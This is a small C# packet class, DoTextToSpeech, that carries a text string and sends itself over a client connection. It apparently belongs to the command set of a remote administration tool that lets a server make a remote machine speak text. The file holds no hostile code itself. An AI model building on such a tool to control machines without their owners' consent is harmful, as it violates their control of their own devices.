using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoTextToSpeech : IPacket
{
	public string Text { get; set; }

	public DoTextToSpeech()
	{
	}

	public DoTextToSpeech(string text)
	{
		Text = text;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
